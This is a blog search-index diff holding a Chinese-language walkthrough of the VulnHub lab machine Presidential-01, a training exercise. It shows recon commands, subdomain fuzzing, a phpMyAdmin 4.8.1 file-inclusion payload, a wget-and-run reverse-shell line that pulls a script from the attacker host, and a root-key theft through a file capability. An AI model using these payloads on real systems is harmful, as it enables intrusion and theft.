@@ -9675,4 +9675,127 @@ SELECT语句中被使用的列名称也被用于结果的列名称。</code><br>
         <tag>Linux提权</tag>
       </tags>
   </entry>
+  <entry>
+    <title>vulnhub靶机系列-Presidential-01</title>
+    <url>/2020/07/29/undefined/</url>
+    <content><![CDATA[<p>联系QQ:1643277253</p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a><strong>环境搭建</strong></h1><p><strong>靶机下载地址</strong>：<a href="https://download.vulnhub.com/presidential/Presidential.ova" target="_blank" rel="noopener">https://download.vulnhub.com/presidential/Presidential.ova</a></p>
+<p><strong>靶机描述</strong>：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">The Presidential Elections within the USA are just around the corner (November <span class="number">2020</span>). One of the political parties is concerned that the other political party is going to perform electoral fraud by hacking into the registration system, <span class="keyword">and</span> falsifying the votes.</span><br><span class="line"></span><br><span class="line">The state of Ontario has therefore asked you (an independent penetration tester) to test the security of their server in order to alleviate any electoral fraud concerns. Your goal is to see <span class="keyword">if</span> you can gain root access to the server – the state is still developing their registration website but has asked you to test their server security before the website <span class="keyword">and</span> registration system are launched.</span><br><span class="line"></span><br><span class="line">This CTF was created <span class="keyword">and</span> has been tested with VirtualBox. It should also be compatible with VMWare <span class="keyword">and</span> is DHCP enabled.</span><br><span class="line"></span><br><span class="line">Rating: Medium/Hard - Enumeration is your friend</span><br></pre></td></tr></table></figure>
+
+<p>靶机下载完成后将.ova文件导入VMWare，网卡设置为NET模式</p>
+<p><strong>环境</strong>：</p>
+<blockquote>
+<p>kali：192.168.102.128<br>靶机：192.168.102.134</p>
+</blockquote>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><strong>主机发现</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">nmap -sP <span class="number">192.168</span><span class="number">.102</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/29/undefined/1595149252105.png" alt="1595149252105"></p>
+<p>得到目标靶机的ip地址为<code>192.168.102.134</code></p>
+<p><strong>端口扫描</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">nmap -A <span class="number">192.168</span><span class="number">.102</span><span class="number">.134</span> -p <span class="number">1</span><span class="number">-65535</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/29/undefined/1595149294464.png" alt="1595149294464"></p>
+<p>扫描得到目标靶机开放了80端口和2082端口，分别为http和ssh端口</p>
+<p>先访问80端口<br><img src="/2020/07/29/undefined/1595149427828.png" alt="1595149427828"></p>
+<p>对网站进行指纹识别</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">whatweb http:<span class="comment">//192.168.102.134</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/29/undefined/1595156232273.png" alt="1595156232273"></p>
+<p>发现该网站使用的语言为php</p>
+<p>使用nikto扫描一下该网站</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">nikto -h http:<span class="comment">//192.168.102.134</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/29/undefined/1595156292255.png" alt="1595156292255"></p>
+<p>得到了一个config.php，访问发现什么都没有</p>
+<p>用dirsearch进行扫描</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http:<span class="comment">//192.168.102.134 -e php</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/29/undefined/1595156444620.png" alt="1595156444620"></p>
+<p>得到了一个目录和一个备份文件，/assets/目录中是一些js、css和一些图片等无法利用的文件 ，之后访问config.php.bak也是一片空白，但是查看源码的时候发现了一些可利用的信息<br><img src="/2020/07/29/undefined/1595156585118.png" alt="1595156585118"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$dbUser = <span class="string">"votebox"</span>;</span><br><span class="line">$dbPass = <span class="string">"casoj3FFASPsbyoRP"</span>;</span><br><span class="line">$dbHost = <span class="string">"localhost"</span>;</span><br><span class="line">$dbname = <span class="string">"votebox"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现了数据库的账号和密码等信息，但是服务器没有开启数据库端口，扫描目录也未发现登陆数据库的地方。这时候不难想到一个ip可能绑定多个域名，或许可以通过查找其子域名来发现突破点。</p>
+<p>在网站首页发现该网站域名为votenow.local<br><img src="/2020/07/29/undefined/1595212803248.png" alt="1595212803248"></p>
+<p>将其添加到/etc/hosts中<br><img src="/2020/07/29/undefined/1595212846057.png" alt="1595212846057"></p>
+<p>之后使用subrake或者wfuzz来进行子域名爆破</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">wfuzz -w /usr/share/wordlists/dirbuster/directory-<span class="keyword">list</span>-lowercase<span class="number">-2.3</span>-medium.txt -H <span class="string">"Host: FUZZ.votenow.local"</span> --hw <span class="number">854</span> --hc <span class="number">400</span> votenow.local</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/29/undefined/1595213526048.png" alt="1595213526048"></p>
+<p>找到votenow.local的一个子域名datasafe.votenow.local，将其添加到/etc/hosts中进行访问，发现该域名为phpmyadmin</p>
+<p><img src="/2020/07/29/undefined/1595213756343.png" alt="1595213756343"></p>
+<p>使用config.php.bak中的账号密码成功登陆</p>
+<p><img src="/2020/07/29/undefined/1595213841083.png" alt="1595213841083"></p>
+<h1 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a><strong>getshell</strong></h1><p>在users表中找到了一个用户名和一串加密的密码，尝试使用john进行解密<br><img src="/2020/07/29/undefined/1595215318286.png" alt="1595215318286"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt john.txt</span><br></pre></td></tr></table></figure>
+
+<p>解密时间很长，先尝试一下其他方法</p>
+<p>我们具有写入权限，尝试写入一句话木马，但是找不到网站的绝对路径，所以不能利用。</p>
+<p>查看phpmyadmin的版本为4.8.1<br><img src="/2020/07/29/undefined/1595216081785.png" alt="1595216081785"></p>
+<p>通过searchsploit搜索该版本漏洞发现了一个本地文件包含漏洞</p>
+<p><img src="/2020/07/29/undefined/1595216492498.png" alt="1595216492498"></p>
+<p><img src="/2020/07/29/undefined/1595216908344.png" alt="1595216908344"></p>
+<p>可根据其给出的方法进行getshell</p>
+<p>首先执行<code>select &#39;&lt;?php phpinfo();exit;?&gt;&#39;</code></p>
+<p><img src="/2020/07/29/undefined/1595218380869.png" alt="1595218380869"></p>
+<p>之后再包含session文件</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_04v0doqg66krlm6e0qqm2rt0vrl3dq7j</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/29/undefined/1595218436730.png" alt="1595218436730"></p>
+<p>可以看到成功执行了php代码，使用同样的方法进行反弹shell<br>先在kali的网站根目录创建一个shell.sh来供靶机下载<br><img src="/2020/07/29/undefined/1595219005911.png" alt="1595219005911"></p>
+<p>之后执行sql语句</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">select <span class="string">'&lt;?php system("wget 192.168.102.128/shell.sh; chmod +x shell.sh; bash shell.sh");exit;?&gt;'</span></span><br></pre></td></tr></table></figure>
+
+<p>在kali中使用nc监听7777端口<br>之后包含session文件即可获得一个shell<br><img src="/2020/07/29/undefined/1595219336651.png" alt="1595219336651"></p>
+<p>这时通过john破解的密码也破解出来了，密码为<strong>Stella</strong>，尝试登录一下<br><img src="/2020/07/29/undefined/1595232696898.png" alt="1595232696898"></p>
+<p>显示权限拒绝<br><img src="/2020/07/29/undefined/1595232772089.png" alt="1595232772089"></p>
+<p>还是使用开始得到的一个shell，这个shell输入字母会自动变成双写，很不方便，使用一下命令即可</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">'import pty; pty.spawn("/bin/bash")'</span></span><br><span class="line"></span><br><span class="line">stty raw -<span class="keyword">echo</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/29/undefined/1595233430620.png" alt="1595233430620"></p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a><strong>提权</strong></h1><p>当前用户为apache，权限很低，并且不知道密码限制了权限的提升。我们可以先切换到admin用户，其密码经过爆破为Stella<br><img src="/2020/07/29/undefined/1595235956318.png" alt="1595235956318"></p>
+<p>尝试sudo提权</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">sudo -l <span class="comment">#查看当前用户sudo⽀持的命令</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/29/undefined/1595237097950.png" alt="1595237097950"></p>
+<p>不能使用sudo进行提权。。</p>
+<p>尝试寻找一些其他有用的信息</p>
+<p>在服务器根目录下发现了两个文件</p>
+<p><img src="/2020/07/29/undefined/1595237293076.png" alt="1595237293076"></p>
+<p>notes.txt提示<strong>利用新命令备份和压缩敏感文件</strong>，user.txt里面是一段md5，破解未成功</p>
+<p>常见的压缩命令为tar，看看tar的位置</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">whereis tar</span><br><span class="line">cd /usr/bin</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/29/undefined/1595237708942.png" alt="1595237708942"></p>
+<p>在浏览过程中发现了tarS命令，该命令应该就是提示中所指的新的压缩备份命令了</p>
+<p>在linux中引入了capabilities 机制对 root 权限进行细粒度的控制，实现按需授权，从而减小系统的安全攻击面。与SUID相似，可以限制用户的权限。<br>查看文件系统中具有capabilities的文件</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">getcap -r / <span class="number">2</span>&gt;/dev/<span class="keyword">null</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/29/undefined/1595238187896.png" alt="1595238187896"></p>
+<p><img src="/2020/07/29/undefined/1595238303788.png" alt="1595238303788"></p>
+<p>可以看到tarS命令具有 <code>cap_dac_read_search</code>功能。它可以绕过文件读权限检查，这样我们就可以读取任何我们想要读取的文件</p>
+<p>我们可以通过读取root用户的SSH私钥来进行免密登陆</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">tarS -cvf key.tar /root/.ssh/id_rsa</span><br><span class="line">tar -xvf key.tar</span><br><span class="line">cd root/.ssh</span><br><span class="line">ssh -i id_rsa root@localhost -p 2082</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/29/undefined/1595238655488.png" alt="1595238655488"></p>
+<p>成功获得root权限<br><img src="/2020/07/29/undefined/1595238696923.png" alt="1595238696923"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h1><p>工具和知识点：</p>
+<blockquote>
+<ul>
+<li>nmap</li>
+<li>whatweb</li>
+<li>nikto</li>
+<li>dirsearch</li>
+<li>john</li>
+<li>searchsploit</li>
+<li>wfuzz爆破子域名</li>
+<li>phpmyadmin4.8.1本地文件包含getshell</li>
+<li>利用capabilities 机制提权</li>
+</ul>
+</blockquote>
+<p>参考文章：<a href="https://www.cnblogs.com/sparkdev/p/11417781.html" target="_blank" rel="noopener">Linux Capabilities 简介</a></p>
+<p><a href="https://0xatom.github.io/vulnhub/2020/07/14/presidential/" target="_blank" rel="noopener">https://0xatom.github.io/vulnhub/2020/07/14/presidential/</a></p>
+]]></content>
+  </entry>
 </search>
